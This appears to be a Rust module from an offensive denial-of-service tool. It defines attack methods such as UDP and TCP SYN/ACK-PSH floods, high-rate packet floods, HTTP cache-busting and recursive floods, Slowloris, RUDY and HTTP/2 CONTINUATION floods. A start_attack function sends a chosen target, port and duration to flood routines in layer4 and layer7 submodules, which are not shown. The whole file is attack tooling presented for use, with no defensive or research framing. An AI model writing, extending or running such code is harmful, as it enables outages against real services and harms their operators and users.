pub mod layer4;
pub mod layer7;

pub enum AttackMethod {
    UdpRandom,
    UdpFragmentation,
    TcpConnection,
    TcpSyn,     // Requires Root/Raw
    TcpAckPsh,  // Requires Root/Raw
    HighPps,
    HttpFlood,
    HttpRecursive,
    HttpSlowloris,
    HttpRudy,
    Http2Continuation,
}

pub async fn start_attack(method: AttackMethod, target: &str, port: u16, duration: u64) {
    match method {
        AttackMethod::UdpRandom | AttackMethod::UdpFragmentation => {
            layer4::udp::udp_flood(target, duration).await;
        },
        AttackMethod::TcpConnection => {
            layer4::tcp::connection_flood(target, port, duration).await;
        },
        AttackMethod::HighPps => {
            layer4::pps::pps_flood(target, port, duration).await;
        },
        AttackMethod::TcpSyn => {
            layer4::tcp::raw_flood(target, port, duration, "SYN").await;
        },
        AttackMethod::TcpAckPsh => {
            layer4::tcp::raw_flood(target, port, duration, "ACK-PSH").await;
        },
        AttackMethod::HttpFlood => {
            // Target is URL for HTTP attacks usually.
            // If user provides IP:PORT, we assume http://IP:PORT/
            let url = if target.starts_with("http") { target.to_string() } else { format!("http://{}:{}", target, port) };
            layer7::http::cache_busting_flood(&url, duration).await;
        },
        AttackMethod::HttpRecursive => {
            let url = if target.starts_with("http") { target.to_string() } else { format!("http://{}:{}", target, port) };
            layer7::http::recursive_flood(&url, duration).await;
        },
        AttackMethod::HttpSlowloris => {
            layer7::slow::slowloris(target, port, duration).await;
        },
        AttackMethod::HttpRudy => {
            layer7::slow::rudy(target, port, duration).await;
        },
        AttackMethod::Http2Continuation => {
            layer7::http2::http2_flood(target, port, duration).await;
        },
    }
}
